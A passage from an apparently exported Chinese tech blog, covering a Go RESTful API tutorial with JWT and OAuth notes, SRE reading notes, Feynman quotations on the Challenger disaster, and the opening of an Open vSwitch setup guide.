class="line"></span><br><span class="line"><span class="keyword">type</span> Routes []Route</span><br></pre></td></tr></table></figure></p>
<h4 id="重构：Handlers-amp-Router"><a href="#重构：Handlers-amp-Router" class="headerlink" title="重构：Handlers &amp; Router"></a>重构：Handlers &amp; Router</h4><p><strong>Handlers.go</strong><br><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;encoding/json&quot;</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;net/http&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/gorilla/mux&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Index</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">    fmt.Fprintln(w, <span class="string">&quot;Welcome!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TodoIndex</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">    todos := Todos&#123;</span><br><span class="line">        Todo&#123;Name: <span class="string">&quot;Write presentation&quot;</span>&#125;,</span><br><span class="line">        Todo&#123;Name: <span class="string">&quot;Host meetup&quot;</span>&#125;,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> err := json.NewEncoder(w).Encode(todos); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TodoShow</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">    vars := mux.Vars(r)</span><br><span class="line">    todoId := vars[<span class="string">&quot;todoId&quot;</span>]</span><br><span class="line">    fmt.Fprintln(w, <span class="string">&quot;Todo show:&quot;</span>, todoId)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><strong>Router.go</strong><br><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;net/http&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/gorilla/mux&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewRouter</span><span class="params">()</span> *<span class="title">mux</span>.<span class="title">Router</span></span> &#123;</span><br><span class="line">    router := mux.NewRouter().StrictSlash(<span class="literal">true</span>)</span><br><span class="line">    <span class="keyword">for</span> _, route := <span class="keyword">range</span> routes &#123;</span><br><span class="line">        <span class="keyword">var</span> handler http.Handler</span><br><span class="line">        handler = route.HandlerFunc</span><br><span class="line">        handler = Logger(handler, route.Name)</span><br><span class="line"></span><br><span class="line">        router.</span><br><span class="line">            Methods(route.Method).</span><br><span class="line">            Path(route.Pattern).</span><br><span class="line">            Name(route.Name).</span><br><span class="line">            Handler(handler)</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> router</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h4 id="启动入口是不是清爽很多！"><a href="#启动入口是不是清爽很多！" class="headerlink" title="启动入口是不是清爽很多！"></a>启动入口是不是清爽很多！</h4><p><strong>Main.go</strong><br><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">Main.<span class="keyword">go</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;log&quot;</span></span><br><span class="line">    <span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    router := NewRouter()</span><br><span class="line">    log.Fatal(http.ListenAndServe(<span class="string">&quot;:8080&quot;</span>, router))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>web access:<a href="http://localhost:8080/todos">http://localhost:8080/todos</a></p>
<blockquote>
<p>Todo Index! ,”/todos”<br>[<br>  {<br>      “id”:0,<br>      “name”:”Write sth ….”,<br>      “completed”:false,<br>      “due”:”0001-01-01T00:00:00<br>  },<br>  {<br>      “id”:1,<br>      “name”:”Host meetup ….”,<br>      “completed”:false,<br>      “due”:”0001-01-01T00:00:00Z”<br>  }<br>]</p>
</blockquote>
<h4 id="增强功能：持久化"><a href="#增强功能：持久化" class="headerlink" title="增强功能：持久化"></a>增强功能：持久化</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TodoCreate</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> todo Todo</span><br><span class="line">    <span class="comment">//add Todo instance</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="增强功能：日志"><a href="#增强功能：日志" class="headerlink" title="增强功能：日志"></a>增强功能：日志</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">2017</span>/<span class="number">05</span>/<span class="number">23</span> <span class="number">15</span>:<span class="number">57</span>:<span class="number">23</span> http: multiple response.WriteHeader calls</span><br><span class="line"><span class="number">2017</span>/<span class="number">05</span>/<span class="number">23</span> <span class="number">15</span>:<span class="number">57</span>:<span class="number">23</span> GET	/todos	TodoIndex	<span class="number">6.</span>945807ms</span><br><span class="line"><span class="number">2017</span>/<span class="number">05</span>/<span class="number">23</span> <span class="number">16</span>:<span class="number">18</span>:<span class="number">40</span> http: multiple response.WriteHeader calls</span><br><span class="line"><span class="number">2017</span>/<span class="number">05</span>/<span class="number">23</span> <span class="number">16</span>:<span class="number">18</span>:<span class="number">40</span> GET	/todos	TodoIndex	<span class="number">2.</span>127435ms</span><br></pre></td></tr></table></figure>
<h2 id="Things-We-Didn’t-Do"><a href="#Things-We-Didn’t-Do" class="headerlink" title="Things We Didn’t Do"></a>Things We Didn’t Do</h2><ol>
<li><p>版本控制<br>API版本迭代 &amp; 跨版本资源访问。常用做法是将版本号放在URL，较为简洁，例如：<a href="https://localhost:8080/v1/">https://localhost:8080/v1/</a><br>另一种做法是将版本号放在HTTP头信息中。</p>
</li>
<li><p>授权验证：涉及到OAuth和JWT。<br>（1）<a href="http://www.rfcreader.com/#rfc6749">OAuth 2.0，OAuth2 is an authentication framework</a>,<a href="http://www.rfcreader.com/#rfc6749">RFC 6749</a><br>OAuth2是一种授权框架，提供了一套详细的、可供实践的指导性解决方案。OAuth 2.0定义了四种授权方式。授权码模式（authorization code）、简化模式（implicit）、密码模式（resource owner password credentials）、客户端模式（client credentials）。</p>
</li>
</ol>
<ul>
<li><a href="https://t.co/HXbBiVorVO">Getting Started with OAuth2 in Go | Youtube</a></li>
<li><a href="https://github.com/ory/fosite">Extensible security first OAuth 2.0 and OpenID Connect SDK for Go </a></li>
</ul>
<p>(2)<a href="https://jwt.io">JSON web tokens,JWT is an authentication protocol</a>,<a href="https://tools.ietf.org/html/rfc7519">RFC 7519</a><br>JWT是一种安全协议。基本思路就是用户提供用户名和密码给认证服务器，服务器验证用户提交信息信息的合法性；如果验证成功，会产生并返回一个Token（令牌），用户可以使用这个token访问服务器上受保护的资源。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ</span><br></pre></td></tr></table></figure>
<p>header:定义算法(alg:ALGORITHM)和TOKEN TYPE（typ）</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">  <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Data:<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;sub&quot;</span>: <span class="string">&quot;1234567890&quot;</span>,</span><br><span class="line">  <span class="string">&quot;name&quot;</span>: <span class="string">&quot;John Doe&quot;</span>,</span><br><span class="line">  <span class="string">&quot;admin&quot;</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<ul>
<li><a href="https://keratin.tech/">AuthN | Modern, open source, web app authentication </a></li>
<li><a href="https://code.tutsplus.com/tutorials/api-authentication-with-nodejs--cms-29536?utm_source=twitter&amp;utm_medium=social&amp;utm_campaign=social_twtr_tuts_code">API Authentication With Node.js</a></li>
</ul>
<ol>
<li>eTags：关于缓存、性能和用户标识和追踪。</li>
</ol>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ol>
<li><a href="http://www.ruanyifeng.com/blog/2014/05/restful_api.html">阮一峰:RESTful API 设计指南</a></li>
<li><a href="https://thenewstack.io/make-a-restful-json-api-go/">CORY LANOU:Making a RESTful JSON API in Go,2014Nov</a></li>
<li><a href="http://www.infoq.com/cn/articles/etags">InfoQ:使用ETags减少Web应用带宽和负载</a></li>
<li><a href="https://stackoverflow.com/questions/39909419/jwt-vs-oauth-authentication">Stackoverflow:jwt vs oauth authentication</a></li>
<li><a href="http://www.seedbox.com/en/blog/2015/06/05/oauth-2-vs-json-web-tokens-comment-securiser-un-api/">OAuth 2 VS JSON Web Tokens:How to secure an API,20160605</a></li>
<li><a href="http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html">阮一峰:理解OAuth 2.0,201405</a></li>
<li><a href="http://openmymind.net/RESTful-routing-in-Go/">RESTful routing in Go | Karl Seguin</a></li>
</ol>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Developer</tag>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>SRE:Site Reliability Engineering</title>
    <url>/2017/04/26/SRE/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>SRE Workflow</li>
<li>Code define Config</li>
<li>拜占庭将军问题</li>
</ul>
<span id="more"></span>
<h2 id="Workflow"><a href="#Workflow" class="headerlink" title="Workflow"></a>Workflow</h2><ul>
<li><a href="http://www.brendangregg.com/blog/2016-05-04/srecon2016-perf-checklists-for-sres.html">SREcon: Performance Checklists for SREs 2016 | Brendan Gregg’s Blog </a></li>
<li><a href="http://www.infoq.com/cn/presentations/a-long-period-of-atypical-jvm-gc-caused-by-os?utm_campaign=infoq_content&amp;utm_source=infoq&amp;utm_medium=feed&amp;utm_term=global">OS 造成的长时间非典型 JVM GC 停顿：深度分析和解决|庄振运</a></li>
</ul>
<h2 id="Discuss"><a href="#Discuss" class="headerlink" title="Discuss"></a>Discuss</h2><ul>
<li><p><a href="https://mp.weixin.qq.com/s?__biz=MjM5NjI5Mjc2MA==&amp;mid=2652990428&amp;idx=1&amp;sn=b1e5f1e7eacee672dda64bd62fec7e13&amp;scene=1&amp;srcid=041641asPQg5BIyJZkCfU6BC#rd">NASA:可以告知故障的机器</a><br>COMSoL综合系统健康管理（Integrated System Health Management）软件的第一个版本于2003年在NASA艾姆斯研究中心（Ames Research Center）被开发出来，以此来监视一个试验型固液混合火箭发动机试车台。</p>
</li>
<li><p><a href="https://mp.weixin.qq.com/s?__biz=MzA3MDQyNzEzOQ==&amp;mid=210032001&amp;idx=1&amp;sn=fe4f38c6bff29dadb56ca4a415bf0cba&amp;scene=1&amp;srcid=0913L7IQ4dMyawN0soqMMP2B#rd">腾讯数据中心:三大谷歌欧洲数据中心究竟如何做到100%自然冷却</a></p>
</li>
</ul>
<h2 id="Application"><a href="#Application" class="headerlink" title="Application"></a>Application</h2><h4 id="Code-define-Config"><a href="#Code-define-Config" class="headerlink" title="Code define Config"></a>Code define Config</h4><ol>
<li><a href="http://blog.serverfault.com/2017/04/11/introducing-dnscontrol-dns-as-code-has-arrived">SRE Team of Stack Overflow: DNSControl</a></li>
</ol>
<ol>
<li><a href="https://riboseyim.github.io/2017/05/26/Protocol/">分类：网络协议</a></li>
</ol>
<h2 id="Monitor"><a href="#Monitor" class="headerlink" title="Monitor"></a>Monitor</h2><ol>
<li><a href="https://logmatic.io/blog/beyond-website-monitoring-the-value-of-access-logs/">beyond website monitoring the value of access logs</a></li>
</ol>
<h2 id="Chris-Jones-分布式共识系统"><a href="#Chris-Jones-分布式共识系统" class="headerlink" title="Chris Jones:分布式共识系统"></a>Chris Jones:分布式共识系统</h2><h4 id="Minghua-Ye：App-Engine"><a href="#Minghua-Ye：App-Engine" class="headerlink" title="Minghua Ye：App Engine"></a>Minghua Ye：App Engine</h4><p><a href="https://www.linkedin.com/in/minghua-ye-9346b062?trk=prof-samename-name">Minghua Ye</a><br>scalable system</p>
<p>automated service discovery</p>
<p><strong>google protocol buffer</strong></p>
<p>消息协议，向后兼容<br><a href="http://blog.csdn.net/caisini_vc/article/details/5599468"></a><br><a href="http://www.ibm.com/developerworks/cn/linux/l-cn-gpb/index.html"></a></p>
<p><strong>core lib c++</strong></p>
<ol>
<li><p>command-line flags<br><a href="https://gobyexample.com/command-line-flags"></a></p>
</li>
<li><p>Logging</p>
</li>
<li><p>Googletest<br>  diff log diff file<br>pages:<a href="https://github.com/google/googletest"></a><br>blogs:<a href="http://www.cnblogs.com/coderzh/archive/2009/04/06/1426755.html"></a></p>
</li>
</ol>
<h4 id="分布式共识系统"><a href="#分布式共识系统" class="headerlink" title="分布式共识系统"></a>分布式共识系统</h4><p>CAP：无人值守的一致的高可用系统是不存在的<br>CA系统：分区难题   脑裂   如何判断主从<br>CP系统＋A：接受分区，在分区的情况下保持一致，牺牲一定损失</p>
<h4 id="Zookeeper"><a href="#Zookeeper" class="headerlink" title="Zookeeper"></a>Zookeeper</h4><ul>
<li><p>拜占庭将军问题<br>稳定状态需要  3N＋1（拜占庭式失败）或2N＋1（非拜占庭式失败）个实例。即多进程达到一致           </p>
</li>
<li><p>单点故障源<br>复制状态机（RSM），很久不动的冷备没有意义，风险更高。<br>应用：分布式cron系统<br>无状态微服务系统，先要有一个保障一致性（存储状态）的可靠服务。</p>
</li>
</ul>
<h2 id="扩展阅读：DevOps-漫谈系列"><a href="#扩展阅读：DevOps-漫谈系列" class="headerlink" title="扩展阅读：DevOps 漫谈系列"></a>扩展阅读：<a href="https://riboseyim.github.io/2016/07/28/DevOps/">DevOps 漫谈系列</a></h2><ul>
<li><a href="https://riboseyim.github.io/2017/08/06/TeamWork-Kanban/">Kanban 看板管理实践</a></li>
<li><a href="https://riboseyim.github.io/2018/03/26/DevOps-Deployment/">DevOps 漫谈：基础设施部署和配置管理</a></li>
<li><a href="https://riboseyim.github.io/2017/11/12/DevOps-Container-Security/">Linux 容器安全的十重境界</a></li>
<li><a href="https://riboseyim.github.io/2017/06/27/Technology-English/">工程师的自我修养：全英文技术学习实践</a></li>
</ul>
<h4 id="DevOps-实践的本质是文化"><a href="#DevOps-实践的本质是文化" class="headerlink" title="DevOps 实践的本质是文化"></a><a href="https://riboseyim.github.io/2018/03/29/DevOps-Culture/">DevOps 实践的本质是文化</a></h4><ul>
<li>学习力－团队生命之根</li>
<li>带领团队翻译书籍</li>
<li>Don’t make me think</li>
<li>凡是被很多人不断重复的好习惯，要将其自动化整合到工具</li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://www.oreilly.com/ideas/what-is-sre-site-reliability-engineering">What is SRE (Site Reliability Engineering)?</a></li>
<li><a href="http://www.infoq.com/cn/presentations/experience-of-google-devops-landing-practice">InfoQ:SRE是什么鬼 / 来自 Google DevOps 经验的落地实践</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>SRE</tag>
        <tag>DevOps</tag>
      </tags>
  </entry>
  <entry>
    <title>人物：理查德·费曼</title>
    <url>/2018/12/31/Science-Feynman/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>费曼留给我们的宝贵财富是他全身心投入科学研究以及忠实践行科学的精神——这包括科学的逻辑架构和研究方法、拒绝教条主义，还有对质疑精神的无限包容。</p>
<a id="more"></a>
<h4 id="发现的乐趣"><a href="#发现的乐趣" class="headerlink" title="发现的乐趣"></a>发现的乐趣</h4><p>为了寻找一个问题的答案，我们要通宵达旦地工作；为了更深入理解一个问题，哪怕是增加一点点的认识，我们也要翻越最险峻的高峰；而最终有所发现时的欢欣愉悦，仅仅是探究世界的乐趣的一部分而已。</p>
<p>奖赏就是发现的乐趣以及看到人们运用我的研究成果，这都是真真切切的奖赏，而荣誉对我没有意义。我不追求荣誉，荣誉是个烦人的东西，在我心目中，荣誉就是肩章，荣誉就是人们穿的制服。从小我爸爸就是这么教我的。荣誉这东西，我无福消受，它只会伤害</p>
<h4 id="科学精神"><a href="#科学精神" class="headerlink" title="科学精神"></a>科学精神</h4><blockquote>
<p>人类特有的心智有缺陷——其中一点就是它会被自己的迷信思想蒙蔽和迷惑。科学方法的发现最终为它找到了一条出路，使其能够反映客观世界，这样科学家才能朝某个研究方向迈出一小步，取得些许的进步，而不是一直兜圈子、止步不前。</p>
<p>科学的方法是先做试验。但是也不能忽视另外一个非常重要的方法，一个很关键的方法，那就是 <strong>把所有的想法放在一起</strong>，然后尝试在你所知的这些事情里找到一种内在的逻辑联系。把你知道的所有事情联系起来，看看它们是否有内在联系，这种做法很有用处。找出不同的事物之间的内在一致性，这种尝试越多，得到的结果越好。</p>
<p>不能只挑选自己喜欢的证据，而是<strong>要考虑所有证据，要做到客观对待</strong>——足以让检验工作进行下去——也不能完全依靠权威理论。</p>
<p>我们现在生活在一个没有科学的时代，几乎人们所有的交流、电视上的言论和书本，所有这些都充斥着不科学的东西。不是说那些内容不好，我是说他们是不科学的。于是，就出现了大量 <strong>打着科学旗号的智力专制</strong>。<br>科学的各个学科门类在其发展过程中都有过这样的教训：认为先辈大师们字字珠玑、说的都是绝对真理，这样的信念是很危险的。<br>—— 理查德·费曼 1966年4月在全美科学教师协会的演讲</p>
</blockquote>
<h4 id="生活伦理"><a href="#生活伦理" class="headerlink" title="生活伦理"></a>生活伦理</h4><blockquote>
<p>冯·诺依曼的一个想法很有意思：<strong>你没有义务为你所在的这个世界负责</strong>。这是他教会我的一件事情。冯·诺依曼的这个忠告，让我卸掉了一个普通个体无法承受之重——就一个个体背负整个社会的责任而言。从此之后，我变成了一个很快乐的人。这是冯·诺依曼在我心里种下的种子，他教会我不用把全世界的痛苦都背在自己身上。</p>
</blockquote>
<h4 id="国之重器"><a href="#国之重器" class="headerlink" title="国之重器"></a>国之重器</h4><p><strong>挑战者号航天飞机灾难</strong> 发生于美国东部时间1986年1月28日上午11时39分：在美国佛罗里达州上空刚起飞73秒的挑战者号航天飞机发生解体，机上7名机组人员丧命。</p>
<p>这次灾难性事故导致美国的航天飞机飞行计划被冻结了长达32个月之久。这次事故的媒体报导的覆盖面极为的广，一项民意调查显示有 85% 的美国人在事故发生后一个小时内就已经听闻这次事件的新闻。</p>
<p>美国总统罗纳德·里根下令组织一个特别委员会——航天飞机挑战者号事故总统调查委员会(以其主席的名字,常称作 <strong>罗杰斯委员会</strong>)负责此次事故的调查工作。罗杰斯委员会发现美国国家航空航天局的组织文化与决策过程中的缺陷与错误成了导致这次事件的关键因素。</p>
<p>《关于“挑战者号”航天飞机事故的少数派调查报告》：</p>
<blockquote>
<p>这里并没有出现这种情况:一边降低标准一边自欺欺人一一对于固体火箭助推器或航天飞机主发动机的安全体系来说，这种情况很明显。确实，管理层最近已经提议要减少这样复杂、耗资又如此巨大的测试——他们认为， 在航天飞机发展业已成熟的现阶段，做这些测试是没有必要的。我们必须抵制这些建议，因为持这种看法的人，他们没有认识到微妙的相互影响，整个项目的某一部分即便一个很细微的变化导致的错误也会影响到项目的其他组成部分。</p>
<p>NASA的管理层都夸大了其产品的可靠性，达到了幻想的程度。</p>
<p>在签订合同、估算成本和评估项目难度等环节，他们也一定要秉承实事求是的态度。他们提出的飞行计划的时间安排一定要合理和切合实际，实施过程中也不至于为了赶期限导致状况百出。<strong>如果他们一一照做了，却得不到政府的支持，那就随他去吧</strong>。</p>
<p>对于一项成功的技术来说，<strong>尊重现实一定要凌驾于公共关系之上</strong>，因为你不能愚弄自然。</p>
</blockquote>
<h2 id="拓展阅读"><a href="#拓展阅读" class="headerlink" title="拓展阅读"></a>拓展阅读</h2><ul>
<li><a href="https://riboseyim.com/2019/02/04/Engineering-Ethics/">工程伦理：国之重器，在人不在宝 | 挑战者号航天飞机事故调查</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5MTY1MjQ3Nw==&amp;mid=2651940500&amp;idx=1&amp;sn=36a6663e996058a543fa13d4d3f4b4fe&amp;chksm=bd5789868a2000902acbda3adde45326aa04edc4db4cc582fdb58c0a8285f3abe762760528a3&amp;token=1403618953&amp;lang=zh_CN#rd" target="_blank" rel="noopener">微信公众号@睿哥杂货铺：推荐|《发现的乐趣》</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2>]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
        <tag>Science</tag>
      </tags>
  </entry>
  <entry>
    <title>SDN 技术指南（四）：Open vSwitch</title>
    <url>/2017/10/13/SDN-OpenvSwitch/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>Open vSwitch 安装</li>
<li>Open vSwitch 命令行</li>
<li>Open vSwitch 运行原理</li>
<li>Open vSwitch 性能监控</li>
</ul>
<span id="more"></span>
<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>由之前发布的文章知道 Open vSwitch(Open Source Virtual Switch) 是一款基于软件实现的开源虚拟交换机。</p>
<ul>
<li><a href="https://riboseyim.github.io/2017/05/12/SDN/">SDN 技术指南（一）: 架构概览</a></li>
<li><a href="https://riboseyim.github.io/2017/08/22/SDN-OpenFlow/">SDN 技术指南（二）: OpenFlow </a></li>
</ul>
<blockquote>
<p><a href="http://www.openswitch.net">Open Source Virtual Switch</a>:Community-Based, Open Source,. Full-Featured Network Operating System.</p>
</blockquote>
<h2 id="一、Open-vSwitch-安装"><a href="#一、Open-vSwitch-安装" class="headerlink" title="一、Open vSwitch 安装"></a>一、Open vSwitch 安装</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"># 第一步：Getting the Code</span><br><span class="line">git clone https:<span class="comment">//git.openswitch.net/openswitch/ops-build</span></span><br><span class="line"></span><br><span class="line"># 第一步：选择编译模式</span><br><span class="line"></span><br><span class="line"># 模式一：To a supported white box <span class="keyword">switch</span> ( 例如 VMware vSwitch、vDS、Nexus <span class="number">1000</span>V)</span><br><span class="line"><span class="built_in">make</span> configure genericx86<span class="number">-64</span></span><br><span class="line"></span><br><span class="line"># 模式二：OVA （可以直接导入虚拟机，例如 Oracle Virtual box ）</span><br><span class="line"><span class="built_in">make</span> configure appliance</span><br><span class="line"></span><br><span class="line"># 第三步：打包</span><br><span class="line"><span class="built_in">make</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="http://riboseyim-qiniu.riboseyim.com/SDN-OVS-Build.png" alt=""></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/SDN-OVS-VM.png" alt=""></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/SDN-OVS-Login.png" alt=""></p>
<h2 id="二、Open-vSwitch-命令行"><a href="#二、Open-vSwitch-命令行" class="headerlink" title="二、Open vSwitch 命令行"></a>二、Open vSwitch 命令行</h2><h4 id="2-1-核心概念"><a href="#2-1-核心概念" class="headerlink" title="2.1 核心概念"></a>2.1 核心概念</h4><ul>
<li>Bridge ：网桥，对应一个以太网交换机（Switch），一个主机中可以创建一个或者多个 Bridge 设备。</li>
<li>Port ：Port 与物理交换机的端口概念类似, 每个 Port 都属于一个特定的 Bridge 。端口类型：Normal、Internal、Patch、Tunnel。</li>
<li>Interface：接口，对应网卡，即可以是 ovs 生成的虚拟网卡，也可能是挂载在 ovs 的物理网卡。在通常情况下，Port 和 Interface 是一对一的关系, 只有在配置 Port 为 bond 模式后，Port 和 Interface 是一对多的关系。</li>
</ul>
<h4 id="2-2-基本操作"><a href="#2-2-基本操作" class="headerlink" title="2.2 基本操作"></a>2.2 基本操作</h4><ul>
<li>ovs-vsctl ： 查询和更新 ovs-vswitchd 的配置；</li>
<li>ovs-appctl ：发送命令消息，运行相关 daemon；</li>
<li>ovsdbmonitor ： GUI工具，可以远程获取 OVS 数据库和 OpenFlow 的流表。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建一个新的交换机</span></span><br><span class="line">$ ovs-vsctl add-br ovs-switch</span><br><span class="line"><span class="comment"># 创建一个端口 设置端口</span></span><br><span class="line"><span class="comment"># 如果在创建端口的时候没有指定 OpenFlow 端口编号，会自动生成一个</span></span><br><span class="line">$ ovs-vsctl add-port ovs-switch p0 -- <span class="built_in">set</span> Interface p0 ofport_request=100</span><br><span class="line"><span class="comment"># 设置接口类型</span></span><br><span class="line">$ ovs-vsctl <span class="built_in">set</span> Interface p0 <span class="built_in">type</span>=internal</span><br><span class="line">$ ethtool -i p0</span><br><span class="line"><span class="comment"># 查看交换机的端口信息</span></span><br><span class="line">$ ovs-ofctl show ovs-switch</span><br><span class="line"><span class="comment"># 查看 datapath 的信息</span></span><br><span class="line">$ ovs-dpctl show</span><br></pre></td></tr></table></figure>
<h2 id="三、Open-vSwitch-运行原理"><a href="#三、Open-vSwitch-运行原理" class="headerlink" title="三、Open vSwitch 运行原理"></a>三、Open vSwitch 运行原理</h2><h4 id="3-1-Open-vSwitch-内部结构"><a href="#3-1-Open-vSwitch-内部结构" class="headerlink" title="3.1 Open vSwitch 内部结构"></a>3.1 Open vSwitch 内部结构</h4><p>Open vSwitch 内部分为用户态和内核态。用户层（态）为守护程序实现了交换机和流表，是 Open vSwitch 的核心，提供了一些组件去管理交换机，实现数据库，对内核进行直接管理。主要包含三个守护进程：</p>
<ul>
<li>ovs-vswitched : 主要模块，守护进程，包括一个 Linux 内核模块。</li>
<li>ovsdb-server : 数据库服务,保存相关配置信息</li>
<li>ovs-brcompatd</li>
</ul>
<p>数据流(flow) 通过 Open vSwitch 转发的流程。每收到一个包之后，OVS Kernel Module 将检查它是否能能命中内核模块的缓存（flow cache) ，如果命中缓存则交由 kernel 处理；如果不能命中缓存则先发送到用户空间（ovs-vswitchd process ）进行转发决策 ——— 基于一系列已经安装配置的规则库（OpenFlow rulues）；如果没有命中任何一条规则，则将包发送给 OpenFlow 控制器处理。一旦做出转发决策，这个包和转发动作将传回 OVS Kernel Module 缓存起来。这条 flow 接下来的包就将命中缓存并直接由 kernel 转发处理。</p>
<ul>
<li>openvswitch_mod.ko 是内核态(kernel)的主要模块<br>完成数据包的查找、转发、修改等操作，一条 flow 的后续数据包到达 OVS 后将直接交由内核态，使用 openvswitch_mod.ko 中的处理函数对数据包进行处理。</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/SDN-OVS-Packet-Processing.png" alt="OVS Flow Processing"><br><img src="http://riboseyim-qiniu.riboseyim.com/SDN-OVS-Command.png" alt="OVS包含一个Linux内核"></p>
<h4 id="3-2-Open-vSwitch-的协议支持情况"><a href="#3-2-Open-vSwitch-的协议支持情况" class="headerlink" title="3.2 Open vSwitch 的协议支持情况"></a>3.2 Open vSwitch 的协议支持情况</h4><ul>
<li>GRE-tunneled mirrors: 远程监控</li>
<li>LACP、VLAN、IGMP、LLDP、BFD、STP、RSTP、QoS、HFSC</li>
<li>Complete IPv6 (Internet Protocol version 6) support</li>
<li>Support for multiple tunneling protocols, including GRE、VXLAN 、STT、IPsec</li>
<li>Multi-table forwarding pipeline with a flow-caching engine</li>
</ul>
<h4 id="3-3-Open-vSwitch-的-OpenFlow-支持情况"><a href="#3-3-Open-vSwitch-的-OpenFlow-支持情况" class="headerlink" title="3.3 Open vSwitch 的 OpenFlow 支持情况"></a>3.3 Open vSwitch 的 OpenFlow 支持情况</h4><ul>
<li>ovs-openflowd：一个简单的 OpenFlow 交换机；</li>
<li>ovs-controller：一个简单的 OpenFlow 控制器；</li>
<li>ovs-ofctl 查询和控制 OpenFlow 交换机和控制器；</li>
<li>ovs-pki ：OpenFlow 交换机创建和管理公钥框架；</li>
<li>ovs-tcpundump：tcpdump 的补丁，解析 OpenFlow 的消息；</li>
</ul>
<p>Open vSwitch support for OpenFlow 1.1 and beyond is a work in progress.<a href="http://docs.openvswitch.org/en/latest/topics/openflow/">&gt;&gt;&gt; OpenFlow Support in Open vSwitch </a></p>
<h2 id="四、Open-vSwitch-性能监控"><a href="#四、Open-vSwitch-性能监控" class="headerlink" title="四、Open vSwitch 性能监控"></a>四、Open vSwitch 性能监控</h2><blockquote>
<p>“If you can’t measure it, you can’t improve it”  —— Lord Kelvin</p>
</blockquote>
<h4 id="4-1-sFlow-监控示例"><a href="#4-1-sFlow-监控示例" class="headerlink" title="4.1 sFlow 监控示例"></a>4.1 sFlow 监控示例</h4><ul>
